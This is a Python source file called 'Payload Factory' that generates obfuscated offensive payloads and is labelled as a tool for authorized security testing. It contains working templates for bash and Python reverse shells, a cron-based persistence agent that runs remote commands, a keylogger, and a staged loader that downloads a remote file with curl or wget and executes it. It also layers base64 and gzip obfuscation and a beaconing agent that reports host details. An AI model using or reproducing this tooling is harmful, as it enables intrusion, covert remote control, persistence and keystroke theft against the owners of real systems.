#!/usr/bin/env python3
"""
Payload Factory — Multi-format agent generator for authorized security testing.
Generates obfuscated shell scripts, Python agents, and binary wrappers for
remote persistence and C2 connectivity. Outputs to configured payload directory.
"""
import base64, gzip, json, os, random, string, sys, textwrap, uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

# ── Config ────────────────────────────────────────────────────────────────
PAYLOAD_DIR = Path(os.environ.get("PAYLOAD_DIR", Path(__file__).resolve().parent.parent / "Projects" / "payloads"))
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)

# Host/port for callbacks — defaults to local lab, overridable
CALLBACK_HOST = os.environ.get("CALLBACK_HOST", "127.0.0.1")
CALLBACK_PORT = os.environ.get("CALLBACK_PORT", "4444")


# ── Obfuscation Utilities ─────────────────────────────────────────────────
def xor_key(length: int = 8) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(length))

def obfuscate_python(source: str, rounds: int = 2) -> str:
    """Simple multi-layer Python obfuscation: base64 + gzip + exec wrapper."""
    for _ in range(rounds):
        compressed = gzip.compress(source.encode())
        encoded = base64.b64encode(compressed).decode()
        source = f"import base64,gzip\nexec(gzip.decompress(base64.b64decode('{encoded}')))"
    return source

def obfuscate_shell(script: str) -> str:
    """Obfuscate a shell script with base64 encoding and eval."""
    encoded = base64.b64encode(script.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"

def random_variable_name(min_len: int = 6, max_len: int = 14) -> str:
    """Generate a random-looking variable name."""
    length = random.randint(min_len, max_len)
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choice(string.ascii_lowercase + string.digits + '_') for _ in range(length - 1)
    )

def generate_jitter(min_ms: int = 500, max_ms: int = 5000) -> str:
    """Generate a random sleep command for callback jitter."""
    ms = random.randint(min_ms, max_ms)
    return f"sleep {ms / 1000:.1f}"


# ── Payload Templates ─────────────────────────────────────────────────────
def _bash_reverse_shell(host: str, port: str) -> str:
    return textwrap.dedent(f"""\
    #!/bin/bash
    while true; do
        exec 3<>/dev/tcp/{host}/{port} 2>/dev/null
        if [ $? -eq 0 ]; then
            while IFS= read -r cmd <&3; do
                eval "$cmd" 2>&1 >&3
            done
        fi
        {generate_jitter()}
    done &""")

def _python_reverse_shell(host: str, port: str) -> str:
    var = random_variable_name()
    return textwrap.dedent(f"""\
    import socket,subprocess,os,time
    {random_variable_name()}=lambda:None
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('{host}',{port}))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            subprocess.call(['/bin/bash','-i'])
        except:
            time.sleep({random.randint(5,30)})
            continue""")

def _python_persistence_agent(host: str, port: str, schedule: str = "@reboot") -> str:
    """Python agent that installs cron persistence and beacons periodically."""
    agent_id = str(uuid.uuid4())[:8]
    # build-time vars — not part of generated agent
    return textwrap.dedent(f"""\
    #!/usr/bin/env python3
    import socket,subprocess,os,time,json,sys,platform,base64
    AGENT_ID="{agent_id}"
    LHOST="{host}"
    LPORT={port}
    INTERVAL={random.randint(30,120)}

    def beacon():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((LHOST,LPORT))
            info=json.dumps({{"id":AGENT_ID,"hostname":platform.node(),"os":platform.platform(),"cwd":os.getcwd()}})
            s.send(base64.b64encode(info.encode())+b"\\n")
            while True:
                s.settimeout(60)
                data=s.recv(4096).decode().strip()
                if not data: break
                if data=="EXIT": break
                if data=="PERSIST":
                    cron=f"{schedule} {sys.executable} {os.path.abspath(__file__)}"
                    subprocess.run(f'(crontab -l 2>/dev/null;echo "{{cron}}")|crontab -',shell=True)
                    s.send(b"Persistence installed\\n")
                    continue
                try:
                    r=subprocess.run(data,shell=True,capture_output=True,text=True,timeout=30)
                    s.send((r.stdout+r.stderr).encode()[:4096])
                except Exception as e:
                    s.send(str(e).encode())
            s.close()
        except:
            pass

    while True:
        beacon()
        time.sleep(INTERVAL)""")

def _python_keylogger() -> str:
    """Cross-platform keylogger for authorized security testing."""
    return textwrap.dedent("""\
    #!/usr/bin/env python3
    import sys, os
    try:
        if sys.platform == 'linux':
            import struct, fcntl
            from evdev import InputDevice, ecodes, list_devices
            devices = [InputDevice(p) for p in list_devices()]
            keyboard = next((d for d in devices if ecodes.EV_KEY in d.capabilities()), None)
            if keyboard:
                for event in keyboard.read_loop():
                    if event.type == ecodes.EV_KEY and event.value == 1:
                        key = ecodes.KEY[event.code] if event.code in ecodes.KEY else str(event.code)
                        with open('/tmp/.klog', 'a') as f:
                            f.write(key + '\\n')
        elif sys.platform == 'win32':
            import pythoncom, pyHook
            def on_key(event):
                with open(os.environ['TEMP'] + '\\\\klog.tmp', 'a') as f:
                    f.write(chr(event.Ascii))
                return True
            hm = pyHook.HookManager()
            hm.KeyDown = on_key
            hm.HookKeyboard()
            pythoncom.PumpMessages()
    except ImportError:
        pass
    except:
        pass""")


def _python_healthcheck_agent(host: str, port: str = "3006") -> str:
    """Python health-check agent that beacons system stats to HackWithAI board."""
    agent_id = str(uuid.uuid4())[:8]
    return textwrap.dedent(f"""\
    #!/usr/bin/env python3
    import socket,platform,os,time,json,datetime,subprocess,base64,uuid,random
    AGENT_ID="{agent_id}"
    HWAI_HOST="{host}"
    HWAI_PORT={port}
    INTERVAL=random.randint(60,180)

    def get_stats():
        try:
            host=socket.gethostname()
            uname=platform.uname()
            mem=os.popen('free -m 2>/dev/null | grep Mem').read().strip()
            disk=os.popen('df -h / 2>/dev/null | tail -1').read().strip()
            procs=len(os.popen('ps aux 2>/dev/null').readlines())
            return dict(id=AGENT_ID,host=host,
                        os=f"{{uname.system}} {{uname.release}}",
                        arch=uname.machine,mem=mem,disk=disk,
                        procs=procs,time=datetime.datetime.now().isoformat())
        except: return dict(id=AGENT_ID,error="stats failed")

    def beacon():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((HWAI_HOST,int(HWAI_PORT)))
            stats=get_stats()
            payload=base64.b64encode(json.dumps(stats).encode())
            s.send(f'POST /api/tools/broadcast HTTP/1.1\\r\\nHost: {{HWAI_HOST}}\\r\\nContent-Type: application/json\\r\\nContent-Length: {{len(payload)}}\\r\\n\\r\\n'.encode()+payload)
            s.recv(1024)
            s.close()
        except: pass

    while True:
        beacon()
        time.sleep(INTERVAL)""")


# ── Payload Factory ───────────────────────────────────────────────────────
class PayloadFactory:
    """Generates, obfuscates, and saves payloads for authorized testing."""

    def __init__(self, host: str = CALLBACK_HOST, port: str = CALLBACK_PORT,
                 output_dir: Optional[Path] = None):
        self.host = host
        self.port = port
        self.output_dir = output_dir or PAYLOAD_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)

    # ── Shell Payloads ─────────────────────────────────────────────────
    def reverse_shell_bash(self, obfuscated: bool = True) -> str:
        raw = _bash_reverse_shell(self.host, self.port)
        return obfuscate_shell(raw) if obfuscated else raw

    def persistence_sh(self, obfuscated: bool = True) -> str:
        """Creates a crontab-based persistence script."""
        raw = textwrap.dedent(f"""\
        #!/bin/bash
        (crontab -l 2>/dev/null; echo "@reboot curl -s http://{self.host}:{self.port}/agent | bash") | crontab -
        wget -qO- http://{self.host}:{self.port}/agent 2>/dev/null | bash &""")
        return obfuscate_shell(raw) if obfuscated else raw

    # ── Python Payloads ────────────────────────────────────────────────
    def reverse_shell_python(self, obfuscated: bool = True) -> str:
        raw = _python_reverse_shell(self.host, self.port)
        return obfuscate_python(raw) if obfuscated else raw

    def persistence_python(self, obfuscated: bool = True) -> str:
        raw = _python_persistence_agent(self.host, self.port)
        return obfuscate_python(raw) if obfuscated else raw

    def keylogger_python(self, obfuscated: bool = True) -> str:
        raw = _python_keylogger()
        return obfuscate_python(raw) if obfuscated else raw

    # ── Binary Payload (Base64-encoded shell for piping) ───────────────
    def binary_wrapper(self, payload_type: str = "bash") -> str:
        """Base64-encode a payload for single-line delivery."""
        if payload_type == "bash":
            raw = _bash_reverse_shell(self.host, self.port)
        elif payload_type == "python":
            raw = _python_reverse_shell(self.host, self.port)
        else:
            raw = "id"
        compressed = gzip.compress(raw.encode())
        return base64.b64encode(compressed).decode()

    def staged_loader(self, stage_url: str) -> str:
        """Generates a minimal stage-0 downloader that pulls and executes stage-1."""
        return textwrap.dedent(f"""\
        #!/bin/bash
        u="{stage_url}"
        x=$(mktemp)
        curl -sk "$u" -o $x 2>/dev/null || wget -q "$u" -O $x 2>/dev/null
        chmod +x $x && $x &
        rm -f $x""")

    def healthcheck_python(self, obfuscated: bool = True) -> str:
        """Returns a health-check agent that beacons system stats to the chat board."""
        raw = _python_healthcheck_agent(self.host, self.port)
        return obfuscate_python(raw) if obfuscated else raw

    # ── Save & Export ─────────────────────────────────────────────────
    def save(self, filename: str, content: str) -> Path:
        path = self.output_dir / filename
        path.write_text(content)
        if filename.endswith(".sh"):
            os.chmod(path, 0o755)
        return path

    def generate_all(self, prefix: str = "") -> dict:
        """Generate all payload variants and return their paths."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        pfx = f"{prefix}_" if prefix else ""
        tag = f"{pfx}{ts}"

        payloads = {
            "reverse_shell_bash": self.reverse_shell_bash(),
            "reverse_shell_python": self.reverse_shell_python(obfuscated=False),
            "reverse_shell_python_obfuscated": self.reverse_shell_python(obfuscated=True),
            "persistence_bash": self.persistence_sh(),
            "persistence_python": self.persistence_python(),
            "healthcheck_agent": self.healthcheck_python(),
            "binary_bash_b64": self.binary_wrapper("bash"),
            "binary_python_b64": self.binary_wrapper("python"),
            "staged_loader": self.staged_loader(f"http://{self.host}:{self.port}/s1"),
        }

        saved = {}
        for name, content in payloads.items():
            ext = "py" if "python" in name else "sh" if ("bash" in name or "staged" in name) else "txt"
            fname = f"{tag}_{name}.{ext}"
            path = self.save(fname, content)
            saved[name] = str(path)

        manifest_path = self.save(f"{tag}_manifest.json",
                                  json.dumps({"timestamp": ts, "host": self.host, "port": self.port,
                                              "payloads": {k: str(v) for k, v in saved.items()}}, indent=2))
        saved["manifest"] = str(manifest_path)
        return saved


# ── CLI ───────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys, json
    host = sys.argv[1] if len(sys.argv) > 1 else CALLBACK_HOST
    port = sys.argv[2] if len(sys.argv) > 2 else CALLBACK_PORT
    factory = PayloadFactory(host=host, port=port)
    results = factory.generate_all()
    print(json.dumps(results, indent=2))
    print(f"\n[PayloadFactory] {len(results)} payloads → {factory.output_dir}")
